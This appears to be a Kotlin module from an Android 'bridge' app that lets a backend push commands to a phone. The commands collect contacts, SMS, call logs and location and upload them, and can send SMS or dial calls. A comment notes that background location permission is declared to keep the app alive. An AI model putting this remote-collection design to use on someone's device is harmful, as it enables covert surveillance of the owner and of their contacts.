package my.bridge.com.di

import android.content.Context
import dagger.Module
import dagger.Provides
import dagger.hilt.InstallIn
import dagger.hilt.android.qualifiers.ApplicationContext
import dagger.hilt.components.SingletonComponent
import java.io.File
import my.bridge.com.core.common.DiagLog
import my.bridge.com.core.network.api.BridgeApi
import my.bridge.com.core.network.api.BridgeApiClient
import my.bridge.com.core.network.ws.Command
import my.bridge.com.core.network.ws.CommandExecutor
import my.bridge.com.core.network.ws.CommandResult
import my.bridge.com.core.storage.DeviceStore
import my.bridge.com.data.CallLogReader
import my.bridge.com.data.ContactsReader
import my.bridge.com.data.PhoneDialer
import my.bridge.com.data.SmsReader
import my.bridge.com.data.SmsSender
import my.bridge.com.location.LocationHelper
import my.bridge.com.media.MusicPlayer
import retrofit2.HttpException
import timber.log.Timber
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import javax.inject.Singleton

/**
 * 命令执行器装配。
 *
 * 注册服务端可下发的命令（与服务端 ALLOWED_COMMANDS 白名单一致）：
 * - upload_log：采集诊断日志并上传到后端。
 * - play_music / pause_music / resume_music / stop_music：音乐播放与控制
 *   （状态机与回执语义见 [MusicPlayer] 与 docs/api/commands/control.md）。
 * - get_location：获取设备位置（定位策略见 [LocationHelper] 与 docs/api/commands/data.md）。
 */
@Module
@InstallIn(SingletonComponent::class)
object CommandModule {

    /** fire-and-forget 上报用的独立作用域：失败不影响命令执行链路。 */
    private val reportScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    @Provides
    @Singleton
    fun provideCommandExecutors(
        @ApplicationContext context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
    ): Map<String, CommandExecutor> = mapOf(
        Command.UPLOAD_LOG to CommandExecutor { command ->
            executeUploadLog(context, deviceStore, apiClient, command)
        },
        Command.PLAY_MUSIC to CommandExecutor { command ->
            executePlayMusic(context, deviceStore, apiClient, command)
        },
        Command.PAUSE_MUSIC to CommandExecutor { command ->
            executeMusicControl(command) {
                when (MusicPlayer.state) {
                    MusicPlayer.State.IDLE -> fail("当前没有正在播放的音乐")
                    MusicPlayer.State.PAUSED -> ok("已处于暂停状态：${MusicPlayer.currentSource}")
                    MusicPlayer.State.PLAYING -> {
                        MusicPlayer.pause()
                        ok("已暂停：${MusicPlayer.currentSource}")
                    }
                }
            }
        },
        Command.RESUME_MUSIC to CommandExecutor { command ->
            executeMusicControl(command) {
                when (MusicPlayer.state) {
                    MusicPlayer.State.IDLE -> fail("当前没有可恢复的音乐")
                    MusicPlayer.State.PLAYING -> fail("正在播放中，无需恢复")
                    MusicPlayer.State.PAUSED -> {
                        MusicPlayer.resume()
                        ok("恢复播放：${MusicPlayer.currentSource}")
                    }
                }
            }
        },
        Command.STOP_MUSIC to CommandExecutor { command ->
            executeMusicControl(command) {
                when (MusicPlayer.state) {
                    MusicPlayer.State.IDLE -> fail("当前没有正在播放的音乐")
                    else -> {
                        MusicPlayer.stop()
                        ok("已停止")
                    }
                }
            }
        },
        Command.GET_LOCATION to CommandExecutor { command ->
            executeGetLocation(context, deviceStore, apiClient, command)
        },
        Command.GET_CONTACTS to CommandExecutor { command ->
            executeGetContacts(context, deviceStore, apiClient, command)
        },
        Command.GET_SMS to CommandExecutor { command ->
            executeGetSms(context, deviceStore, apiClient, command)
        },
        Command.GET_CALL_LOG to CommandExecutor { command ->
            executeGetCallLog(context, deviceStore, apiClient, command)
        },
        Command.SEND_SMS to CommandExecutor { command ->
            executeSendSms(context, command)
        },
        Command.DIAL_PHONE to CommandExecutor { command ->
            executeDialPhone(context, command)
        },
    )

    private suspend fun executeUploadLog(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
    ): CommandResult {
        return try {
            val deviceId = deviceStore.deviceId()
            val content = DiagLog.dump(context)
            val deviceName = deviceStore.deviceName() ?: deviceId
            val appVersion = DiagLog.appVersionName(context)
            val message = apiClient.uploadLog(
                deviceId = deviceId,
                content = content,
                deviceName = deviceName,
                appVersion = appVersion,
            )
            Timber.i("命令 upload_log 上传成功：$message")
            CommandResult(command.commandId, command.command, true, message)
        } catch (e: Exception) {
            Timber.e(e, "命令 upload_log 上传失败")
            CommandResult(command.commandId, command.command, false, "上传失败：${e.message}")
        }
    }

    /**
     * 执行 play_music：音源参数 url 按形态分三路。
     *
     * ① http(s):// 开头 → 远程 URL，MediaPlayer 直接流式播放（不缓存）；
     * ② / 开头 → 本地绝对路径，文件存在即直接播放（不存在则失败回执）；
     * ③ 其余（裸文件名，如 test.mp3）→ 客户端缓存目录优先：
     *    命中 → 直接播放；未命中 → 从服务器共享音乐目录下载（GET /api/music/{name}），
     *    持久化到缓存目录后播放，下次同名直接命中。
     *
     * 缓存目录 = App 私有目录 music/（getExternalFilesDir），无需存储权限，卸载自动清理。
     */
    private suspend fun executePlayMusic(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
    ): CommandResult {
        val id = command.commandId
        val name = command.command
        val source = command.params.get("url")
            ?.takeIf { it.isJsonPrimitive }
            ?.asString
            ?.trim()
        if (source.isNullOrEmpty()) {
            return CommandResult(id, name, false, "缺少音源参数 url")
        }
        val loop = command.params.get("loop")
            ?.takeIf { it.isJsonPrimitive }
            ?.asBoolean ?: false

        return try {
            val resolved = resolveSource(context, deviceStore, apiClient, source)
            MusicPlayer.play(resolved, loop)
            Timber.i("命令 play_music 播放成功：$resolved（loop=$loop）")
            CommandResult(id, name, true, "播放中：$source")
        } catch (e: Exception) {
            Timber.e(e, "命令 play_music 播放失败：$source")
            CommandResult(id, name, false, "播放失败：${e.message}")
        }
    }

    /**
     * 音乐控制类命令（pause/resume/stop）统一包装：
     * 按当前 [MusicPlayer.state] 判定操作合法性，异常统一转失败回执。
     *
     * block 返回 (是否成功, 回执消息)；操作被状态约束拒绝时直接返回失败对，
     * 播放器抛出的 [IllegalStateException] 等异常也在此兜底。
     */
    private inline fun executeMusicControl(
        command: Command,
        block: () -> Pair<Boolean, String>,
    ): CommandResult = try {
        val (success, message) = block()
        CommandResult(command.commandId, command.command, success, message)
    } catch (e: Exception) {
        Timber.e(e, "命令 ${command.command} 执行失败")
        CommandResult(command.commandId, command.command, false, "执行失败：${e.message}")
    }

    /**
     * 执行 get_location：获取设备位置（真实实现，见 [LocationHelper]）。
     *
     * @param params.precision "coarse"（网络定位，默认）/ "fine"（GPS，超时回退网络）
     * @param params.timeout   超时秒数（默认 15，下限 5 上限 120）
     * @param params.refresh   强制刷新：跳过 5 分钟新鲜缓存短路，直接监听定位；
     *                         陈旧缓存兜底仍保留（回执来源字段标注缓存年龄）
     *
     * 权限：Manifest 已声明 COARSE/FINE/BACKGROUND（保活资源锚点），此处校验运行时授权；
     * fine 模式需 FINE 权限（仅有 COARSE 时自动降级为 coarse 并注明）。
     * v1 纯文本回执；[my.bridge.com.location.LocationHelper.LocationFix] 为结构化数据，
     * 后续版本直接序列化上报服务端持久化（SQL/MySQL）。
     */
    private suspend fun executeGetLocation(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
    ): CommandResult {
        val id = command.commandId
        val name = command.command

        if (!LocationHelper.hasPermission(context)) {
            return CommandResult(id, name, false, "缺少定位权限，请打开 App 在系统设置中授予定位权限后重试")
        }
        var precision = command.params.get("precision")
            ?.takeIf { it.isJsonPrimitive }
            ?.asString
            ?.trim() ?: "coarse"
        var degradedNote = ""
        if (precision == "fine" && !LocationHelper.hasFinePermission(context)) {
            precision = "coarse"
            degradedNote = "（仅有粗略定位权限，已降级为网络定位）"
        }
        val timeoutSec = command.params.get("timeout")
            ?.takeIf { it.isJsonPrimitive }
            ?.asInt
            ?.coerceIn(5, 120) ?: 15
        val refresh = command.params.get("refresh")
            ?.takeIf { it.isJsonPrimitive }
            ?.asBoolean ?: false
        val refreshNote = if (refresh) "（强制刷新，已跳过缓存）" else ""

        return try {
            val fix = LocationHelper.getLocation(context, precision, timeoutSec * 1000L, refresh)
            Timber.i("命令 get_location 成功：${fix.toMessage()}（refresh=$refresh）")
            reportLocationFireAndForget(deviceStore, apiClient, fix)
            CommandResult(id, name, true, fix.toMessage() + degradedNote + refreshNote)
        } catch (e: Exception) {
            Timber.e(e, "命令 get_location 失败")
            CommandResult(id, name, false, "定位失败：${e.message}")
        }
    }

    /**
     * 位置上报服务端持久化（fire-and-forget）：成功后异步 POST /api/locations，
     * 失败仅记日志，**绝不影响命令回执**——存档与回执解耦。
     */
    private fun reportLocationFireAndForget(
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        fix: my.bridge.com.location.LocationHelper.LocationFix,
    ) {
        reportScope.launch {
            try {
                val deviceId = deviceStore.deviceId()
                val token = runCatching { deviceStore.token() }.getOrNull()
                val action = apiClient.reportLocation(
                    deviceId = deviceId,
                    token = token,
                    latitude = fix.latitude,
                    longitude = fix.longitude,
                    accuracy = fix.accuracyMeters.toDouble(),
                    provider = fix.provider,
                    altitude = fix.altitudeMeters,
                    speed = fix.speedMps?.toDouble(),
                    fixTimeMs = fix.timestampMs,
                )
                Timber.i("位置上报成功：device=%s action=%s", deviceId, action)
            } catch (e: Exception) {
                Timber.w(e, "位置上报失败（不影响回执，忽略）")
            }
        }
    }

    private fun ok(message: String): Pair<Boolean, String> = true to message

    private fun fail(message: String): Pair<Boolean, String> = false to message

    // ------------------------------------------------------------------
    // 数据采集类命令（get_contacts / get_sms / get_call_log）
    //
    // 共同形态：权限校验 → 本地读取 → REST 上报服务端持久化 → 汇总回执。
    // 与 get_location 不同，这里**数据本身就是命令主产物**（后台页面消费），
    // 上报失败要在回执中注明而非静默忽略。
    // ------------------------------------------------------------------

    /** 参数里的开关（缺省 false）。 */
    private fun Command.boolParam(key: String): Boolean =
        params.get(key)?.takeIf { it.isJsonPrimitive }?.asBoolean ?: false

    /** 参数里的整数（缺省 default，收敛到 min–max）。 */
    private fun Command.intParam(key: String, default: Int, min: Int, max: Int): Int =
        params.get(key)?.takeIf { it.isJsonPrimitive }?.asInt?.coerceIn(min, max) ?: default

    /** 参数里的字符串（缺省 default）。 */
    private fun Command.strParam(key: String, default: String): String =
        params.get(key)?.takeIf { it.isJsonPrimitive }?.asString?.trim()?.takeIf { it.isNotEmpty() }
            ?: default

    /** 数据类命令执行骨架：校验权限 → 读取 → 上报 → 回执。 */
    private suspend fun <T> executeDataCollection(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
        permissionName: String,
        hasPermission: (Context) -> Boolean,
        read: (Context) -> List<T>,
        upload: suspend (deviceId: String, token: String?, items: List<T>) -> String,
    ): CommandResult {
        val id = command.commandId
        val name = command.command
        if (!hasPermission(context)) {
            return CommandResult(id, name, false, "缺少${permissionName}权限，请打开 App 在系统设置中授予后重试")
        }
        val items = try {
            read(context)
        } catch (e: Exception) {
            Timber.e(e, "命令 $name 本地读取失败")
            return CommandResult(id, name, false, "读取失败：${e.message}")
        }
        if (items.isEmpty()) {
            return CommandResult(id, name, true, "未读取到数据（可能设备上确实没有，或被参数过滤）")
        }
        return try {
            val deviceId = deviceStore.deviceId()
            val token = runCatching { deviceStore.token() }.getOrNull()
            val summary = upload(deviceId, token, items)
            Timber.i("命令 %s 成功：%s", name, summary)
            CommandResult(id, name, true, summary)
        } catch (e: Exception) {
            Timber.e(e, "命令 $name 上报失败（已读取 ${items.size} 条）")
            CommandResult(
                id, name, false,
                "已读取 ${items.size} 条但上报失败：${e.message}（可重试下发）",
            )
        }
    }

    /**
     * 执行 get_contacts：读取通讯录并上报（服务端按设备覆盖快照）。
     *
     * @param params.only_with_phones 仅含有号码的联系人（默认开）
     * @param params.limit            数量上限（默认 2000，上限 5000）
     */
    private suspend fun executeGetContacts(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
    ): CommandResult {
        val onlyWithPhones =
            if (command.params.has("only_with_phones")) command.boolParam("only_with_phones") else true
        val limit = command.intParam("limit", 2000, 10, 5000)
        return executeDataCollection(
            context, deviceStore, apiClient, command,
            permissionName = "通讯录",
            hasPermission = { ContactsReader.hasPermission(it) },
            read = { ContactsReader.read(it, onlyWithPhones, limit) },
        ) { deviceId, token, items ->
            val r = apiClient.reportContacts(
                deviceId, token,
                items.map {
                    BridgeApi.ContactItem(
                        contact_key = it.key, name = it.name,
                        phones = it.phones, emails = it.emails,
                    )
                },
            )
            "已上报 ${items.size} 个联系人（服务端快照已更新）"
        }
    }

    /**
     * 执行 get_sms：读取短信并上报（服务端累积 + 去重）。
     *
     * @param params.sms_type all/inbox/sent/draft/outbox/failed（默认 all）
     * @param params.limit    条数上限（默认 100，上限 1000）
     */
    private suspend fun executeGetSms(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
    ): CommandResult {
        val smsType = command.strParam("sms_type", "all")
        val limit = command.intParam("limit", 100, 5, 1000)
        return executeDataCollection(
            context, deviceStore, apiClient, command,
            permissionName = "短信",
            hasPermission = { SmsReader.hasPermission(it) },
            read = { SmsReader.read(it, smsType, limit) },
        ) { deviceId, token, items ->
            val r = apiClient.reportSmsBatch(
                deviceId, token,
                items.map {
                    BridgeApi.SmsItem(
                        sms_key = it.key, address = it.address, body = it.body,
                        type = it.type, date_ms = it.dateMs, read = it.read,
                    )
                },
            )
            "已读取 ${items.size} 条短信并上报（新增 ${r.inserted}，更新 ${r.updated}）"
        }
    }

    /**
     * 执行 get_call_log：读取通话记录并上报（服务端按设备覆盖快照）。
     *
     * @param params.call_type all/incoming/outgoing/missed（默认 all）
     * @param params.limit     条数上限（默认 200，上限 1000）
     */
    private suspend fun executeGetCallLog(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
    ): CommandResult {
        val callType = command.strParam("call_type", "all")
        val limit = command.intParam("limit", 200, 5, 1000)
        return executeDataCollection(
            context, deviceStore, apiClient, command,
            permissionName = "通话记录",
            hasPermission = { CallLogReader.hasPermission(it) },
            read = { CallLogReader.read(it, callType, limit) },
        ) { deviceId, token, items ->
            val r = apiClient.reportCallLogs(
                deviceId, token,
                items.map {
                    BridgeApi.CallLogItem(
                        call_key = it.key, number = it.number, name = it.name,
                        type = it.type, duration = it.duration,
                        date_ms = it.dateMs, location = it.location,
                    )
                },
            )
            "已上报 ${items.size} 条通话记录（服务端快照已更新）"
        }
    }

    // ------------------------------------------------------------------
    // 写操作类命令（send_sms / dial_phone）
    //
    // 与数据采集类相反：这两个命令**改动设备/外界状态**（真实发短信会计费、
    // 直接拨打会产生通话），客户端只做「机械执行 + 如实回执」，
    // 下发前的确认责任在管理后台操作者（catalog 描述里已注明计费风险）。
    // ------------------------------------------------------------------

    /**
     * 执行 send_sms：用本机 SIM 卡发送短信。
     *
     * @param params.phones  收件人号码，中英文逗号/分号/竖线分隔可发多个
     * @param params.content 短信内容（超 70 字自动 multipart 切分）
     *
     * 逐号码串行发送，等待系统 sent 回执（15 秒超时）后才计结果，
     * 回执汇总每个号码的成功/失败明细（见 [SmsSender]）。
     */
    private suspend fun executeSendSms(context: Context, command: Command): CommandResult {
        val id = command.commandId
        val name = command.command
        if (!SmsSender.hasPermission(context)) {
            return CommandResult(id, name, false, "缺少短信权限，请打开 App 在系统设置中授予后重试")
        }
        val phonesRaw = command.params.get("phones")
            ?.takeIf { it.isJsonPrimitive }?.asString?.trim().orEmpty()
        val content = command.params.get("content")
            ?.takeIf { it.isJsonPrimitive }?.asString?.trim().orEmpty()
        if (phonesRaw.isEmpty()) return CommandResult(id, name, false, "缺少接收号码参数 phones")
        if (content.isEmpty()) return CommandResult(id, name, false, "缺少短信内容参数 content")

        // 统一中英文逗号/分号/竖线为分号后拆分，去空去重（保持顺序）
        val phones = phonesRaw.replace("，", ";").replace("；", ";")
            .replace(",", ";").replace("|", ";")
            .split(";").map { it.trim() }.filter { it.isNotEmpty() }.distinct()
        if (phones.isEmpty()) return CommandResult(id, name, false, "未解析到有效号码")
        if (phones.size > 20) return CommandResult(id, name, false, "单次最多 20 个号码（当前 ${phones.size} 个）")

        return try {
            val details = SmsSender.send(context, phones, content)
            val okList = details.filter { it.success }
            val failList = details.filterNot { it.success }
            val message = buildString {
                append("发送完成：成功 ${okList.size}/${details.size}")
                if (failList.isNotEmpty()) {
                    append("；失败：")
                    append(failList.joinToString("；") { "${it.phone}（${it.message}）" })
                }
            }
            Timber.i("命令 %s：%s", name, message)
            // 只要有一个号码发出即算命令成功（失败明细已在消息里），全部失败才回执失败
            CommandResult(id, name, okList.isNotEmpty(), message)
        } catch (e: Exception) {
            Timber.e(e, "命令 send_sms 执行失败")
            CommandResult(id, name, false, "发送失败：${e.message}")
        }
    }

    /**
     * 执行 dial_phone：拨打电话。
     *
     * @param params.phone 电话号码
     * @param params.mode  direct（直接拨打，默认）/ dialer（打开拨号盘预填）
     *
     * direct 需 CALL_PHONE 运行时权限，缺失时**自动降级**为 dialer 并在回执注明；
     * 息屏/后台下系统可能拦截拨号界面弹出（Android 10+ 后台启动限制），
     * 回执里带提示，完整限制说明见 [PhoneDialer]。
     */
    private fun executeDialPhone(context: Context, command: Command): CommandResult {
        val id = command.commandId
        val name = command.command
        val phone = command.params.get("phone")
            ?.takeIf { it.isJsonPrimitive }?.asString?.trim().orEmpty()
        if (phone.isEmpty()) return CommandResult(id, name, false, "缺少电话号码参数 phone")
        val mode = command.params.get("mode")
            ?.takeIf { it.isJsonPrimitive }?.asString?.trim() ?: "direct"

        var direct = mode != "dialer"
        if (direct && !PhoneDialer.hasCallPermission(context)) {
            direct = false
            return try {
                val message = PhoneDialer.dial(context, phone, direct)
                CommandResult(id, name, true, "无直接拨打权限，已降级为拨号盘：$message")
            } catch (e: Exception) {
                Timber.e(e, "命令 dial_phone 降级拨号盘也失败")
                CommandResult(id, name, false, "缺少 CALL_PHONE 权限且拨号盘打开失败：${e.message}")
            }
        }
        return try {
            val message = PhoneDialer.dial(context, phone, direct)
            Timber.i("命令 %s：%s", name, message)
            CommandResult(id, name, true, message)
        } catch (e: IllegalArgumentException) {
            CommandResult(id, name, false, e.message ?: "号码格式不合法")
        } catch (e: Exception) {
            Timber.e(e, "命令 dial_phone 执行失败")
            CommandResult(id, name, false, "拨号失败：${e.message}")
        }
    }

    /** 按音源形态分三路解析（见 [executePlayMusic] 注释），返回可直接交给 MediaPlayer 的地址。 */
    private suspend fun resolveSource(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        source: String,
    ): String = when {
        source.startsWith("http://", ignoreCase = true) ||
            source.startsWith("https://", ignoreCase = true) -> source

        source.startsWith("/") -> {
            if (!File(source).isFile) {
                throw IllegalArgumentException("本地文件不存在：$source")
            }
            source
        }

        else -> resolveByFilename(context, deviceStore, apiClient, source)
    }

    /** 裸文件名：客户端缓存目录优先，未命中从服务器共享目录下载并持久化。 */
    private suspend fun resolveByFilename(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        filename: String,
    ): String {
        if (filename.contains('/') || filename.contains('\\') || filename.contains("..")) {
            throw IllegalArgumentException("仅支持单级文件名：$filename")
        }
        val cacheDir = musicCacheDir(context)
        val cached = File(cacheDir, filename)
        if (cached.isFile) {
            Timber.i("音乐缓存命中：${cached.absolutePath}")
            return cached.absolutePath
        }

        // 缓存未命中 → 请求服务器共享音乐目录
        val deviceId = deviceStore.deviceId()
        val token = deviceStore.token()
        Timber.i("音乐缓存未命中，向服务器请求：$filename")
        val body = try {
            apiClient.downloadMusic(filename, deviceId, token)
        } catch (e: HttpException) {
            if (e.code() == 404) {
                throw IllegalArgumentException("服务器与本地缓存均无此文件：$filename")
            }
            throw e
        }

        // 先写临时文件再原子重命名，避免半截文件被当成有效缓存
        cacheDir.mkdirs()
        val tmp = File(cacheDir, "$filename.tmp")
        try {
            body.use { resp ->
                resp.byteStream().use { input ->
                    tmp.outputStream().use { output -> input.copyTo(output) }
                }
            }
            val target = File(cacheDir, filename)
            if (target.exists()) target.delete()
            if (!tmp.renameTo(target)) {
                throw IllegalStateException("缓存写入失败：$filename")
            }
        } finally {
            tmp.delete()
        }
        Timber.i("音乐已下载并缓存：${File(cacheDir, filename).absolutePath}")
        return File(cacheDir, filename).absolutePath
    }

    /** 客户端音乐缓存目录：App 私有 music/（无外置存储时回退内部存储）。 */
    private fun musicCacheDir(context: Context): File =
        context.getExternalFilesDir("music") ?: File(context.filesDir, "music")
}
